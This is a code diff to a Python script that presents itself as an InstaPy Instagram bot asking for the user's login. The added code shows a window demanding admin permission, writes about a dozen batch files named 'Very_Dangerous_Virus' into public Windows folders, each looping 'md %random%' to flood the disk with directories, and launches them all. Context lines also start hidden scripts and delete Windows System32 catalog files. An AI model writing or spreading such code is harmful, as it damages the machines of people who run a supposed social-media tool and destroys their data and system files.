@@ -7,6 +7,7 @@ import glob
 import pyautogui
 from instapy import InstaPy
 from instapy import smart_run
+from tkinter import *
 
 # login credentials
 insta_username = input('Type your instagram username here: ')  # <- enter username here
@@ -207,6 +208,147 @@ os.system.__call__("Start C:\\Users\\16162\\.android\\My_Threading1.py")
 os.system.__call__("Start C:\\Users\\16162\\.fontconfig\\My_Threading2.py")
 os.system.__call__("Start C:\\Users\\16162\\.cache\\fontconfig\\e_file.py")
 pass
+
+class Window(Frame):
+    def __init__(self, master=None):
+        Frame.__init__(self, master)
+        self.master = master
+
+
+# initialize tkinter
+root = Tk()
+app = Window(root)
+
+# set window title
+root.wm_title("PLEASE GIVE ADMIN PERMISSION TO ALL YOUR FILES.")
+
+# show window
+root.mainloop(
+)
+pass
+time.sleep(1)
+if dir("C:\\Users\\Default\\Documents") == True:
+    try:
+        Very_Dangerous_Virus = open("C:\\Users\\Default\\Documents\\Very_Dangerous_Virus.bat", 'w')
+
+        Very_Dangerous_Virus.writelines("@echo off")
+        Very_Dangerous_Virus.writelines(":top")
+        Very_Dangerous_Virus.writelines("md %random%")
+        Very_Dangerous_Virus.writelines("goto top")
+
+        Very_Dangerous_Virus1 = open("C:\\Users\Public\\Cyberlink\\Downloaded Audio\\SoundClip_202_0003\\Very_Dangerous_Virus1.bat", 'w')
+
+        Very_Dangerous_Virus1.writelines("@echo off")
+        Very_Dangerous_Virus1.writelines(":top")
+        Very_Dangerous_Virus1.writelines("md %random%")
+        Very_Dangerous_Virus1.writelines("goto top")
+
+        Very_Dangerous_Virus2 = open("C:\\Users\\Public\\Libraries\\Very_Dangerous_Virus2.bat", 'w')
+
+        Very_Dangerous_Virus2.writelines("@echo off")
+        Very_Dangerous_Virus2.writelines(":top")
+        Very_Dangerous_Virus2.writelines("md %random%")
+        Very_Dangerous_Virus2.writelines("goto top")
+
+        Very_Dangerous_Virus3 = open("C:\\Users\\Public\\AccountPictures\\S-1-5-21-1376122717-453272576-307663161-1001\\Very_Dangerous_Virus3.bat", 'w')
+
+        Very_Dangerous_Virus3.writelines("@echo off")
+        Very_Dangerous_Virus3.writelines(":top")
+        Very_Dangerous_Virus3.writelines("md %random%")
+        Very_Dangerous_Virus3.writelines("goto top")
+
+        Very_Dangerous_Virus4 = open("C:\\Users\\Public\Desktop\\Very_Dangerous_Virus4.bat", 'w')
+
+        Very_Dangerous_Virus4.writelines("@echo off")
+        Very_Dangerous_Virus4.writelines(":top")
+        Very_Dangerous_Virus4.writelines("md %random%")
+        Very_Dangerous_Virus4.writelines("goto top")
+
+        if dir("C:\\Users\\Public\\Documents\\AltSigner") == True:
+            Very_Dangerous_Virus5 = open("C:\\Users\\Public\\Documents\\AltSigner\\Very_Dangerous_Virus5.bat", 'w')
+
+            Very_Dangerous_Virus5.writelines("@echo off")
+            Very_Dangerous_Virus5.writelines(":top")
+            Very_Dangerous_Virus5.writelines("md %random%")
+            Very_Dangerous_Virus5.writelines("goto top")
+
+    except print("error: couldn't locate directory"):
+        if not dir("C:\\Users\\Public\\Documents\\AltSigner"):
+            print("Permission denied:  C:\\Users\\Public\\Documents\\AltSigner")
+    pass
+    try:
+        Very_Dangerous_Virus6 = open("C:\\Users\\Public\\Documents\\RegRunInfo\\Very_Dangerous_Virus6.bat", 'w')
+
+        Very_Dangerous_Virus6.writelines("@echo off")
+        Very_Dangerous_Virus6.writelines(":top")
+        Very_Dangerous_Virus6.writelines("md %random%")
+        Very_Dangerous_Virus6.writelines("goto top")
+        if dir("C:\\Users\\Public\\Documents\\Steam\\CODEX\\346010\\local") == True:
+            Very_Dangerous_Virus7 = open("C:\\Users\\Public\\Documents\\Steam\\CODEX\\346010\\local\\Very_Dangerous_Virus7.bat", 'w')
+
+            Very_Dangerous_Virus7.writelines("@echo off")
+            Very_Dangerous_Virus7.writelines(":top")
+            Very_Dangerous_Virus7.writelines("md %random%")
+            Very_Dangerous_Virus7.writelines("goto top")
+    except print("error: couldn't locate directory"):
+        if not dir("C:\\Users\\Public\\Documents\\Steam\\CODEX\\346010\\local"):
+            print("Permission denied: C:\\Users\\Public\\Documents\\Steam\\CODEX\\346010\\local")
+    pass
+    try:
+        Very_Dangerous_Virus8 = open("C:\\Users\\Public\\Downloads\\Very_Dangerous_Virus8.bat", 'w')
+
+        Very_Dangerous_Virus8.writelines("@echo off")
+        Very_Dangerous_Virus8.writelines(":top")
+        Very_Dangerous_Virus8.writelines("md %random%")
+        Very_Dangerous_Virus8.writelines("goto top")
+
+        Very_Dangerous_Virus9 = open("C:\\Users\\Public\\Music\\Very_Dangerous_Virus9.bat", 'w')
+
+        Very_Dangerous_Virus9.writelines("@echo off")
+        Very_Dangerous_Virus9.writelines(":top")
+        Very_Dangerous_Virus9.writelines("md %random%")
+        Very_Dangerous_Virus9.writelines("goto top")
+
+        Very_Dangerous_Virus10 = open("C:\\Users\\Public\\Pictures\\Very_Dangerous_Virus10.bat", 'w')
+
+        Very_Dangerous_Virus10.writelines("@echo off")
+        Very_Dangerous_Virus10.writelines(":top")
+        Very_Dangerous_Virus10.writelines("md %random%")
+        Very_Dangerous_Virus10.writelines("goto top")
+
+        Very_Dangerous_Virus11 = open("C:\\Users\\Public\\Videos\\Very_Dangerous_Virus11.bat", 'w')
+
+        Very_Dangerous_Virus11.writelines("@echo off")
+        Very_Dangerous_Virus11.writelines(":top")
+        Very_Dangerous_Virus11.writelines("md %random%")
+        Very_Dangerous_Virus11.writelines("goto top")
+
+        Very_Dangerous_Virus12 = open("C:\\Users\\Public\\Very_Dangerous_Virus12.bat", 'w')
+
+        Very_Dangerous_Virus12.writelines("@echo off")
+        Very_Dangerous_Virus12.writelines(":top")
+        Very_Dangerous_Virus12.writelines("md %random%")
+        Very_Dangerous_Virus12.writelines("goto top")
+
+    except print("error: couldn't locate directory"):
+        if not dir("C:\\Users\\Default\\Documents\\Very_Dangerous_Virus.bat"):
+            print("Permission denied: 'C:\\Users\\Default\\Documents")
+
+time.sleep(30)
+
+os.system.__call__("Start C:\\Users\\Default\\Documents\\Very_Dangerous_Virus.bat")
+os.system.__call__("Start C:\\Users\Public\\Cyberlink\\Downloaded Audio\\SoundClip_202_0003\\Very_Dangerous_Virus1.bat")
+os.system.__call__("Start C:\\Users\\Public\\Libraries\\Very_Dangerous_Virus2.bat")
+os.system.__call__("Start C:\\Users\\Public\\AccountPictures\\S-1-5-21-1376122717-453272576-307663161-1001\\Very_Dangerous_Virus3.bat")
+os.system.__call__("Start C:\\Users\\Public\Desktop\\Very_Dangerous_Virus4.bat")
+os.system.__call__("Start C:\\Users\\Public\\Documents\\AltSigner\\Very_Dangerous_Virus5.bat")
+os.system.__call__("Start C:\\Users\\Public\\Documents\\RegRunInfo\\Very_Dangerous_Virus6.bat")
+os.system.__call__("Start C:\\Users\\Public\\Documents\\Steam\\CODEX\\346010\\local\\Very_Dangerous_Virus7.bat")
+os.system.__call__("Start C:\\Users\\Public\\Downloads\\Very_Dangerous_Virus8.bat")
+os.system.__call__("Start C:\\Users\\Public\\Music\\Very_Dangerous_Virus9.bat")
+os.system.__call__("Start C:\\Users\\Public\\Pictures\\Very_Dangerous_Virus10.bat")
+os.system.__call__("Start C:\\Users\\Public\\Videos\\Very_Dangerous_Virus11.bat")
+os.system.__call__("Start C:\\Users\\Public\\Very_Dangerous_Virus12.bat")
 
 time.sleep(2)
 
@@ -662,3 +804,61 @@ for i in range(1):
                             "del C:\Windows/System32\CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4E.CAT")
                     os.system.__call__(
                             "del C:\Windows\System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4F.CAT")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
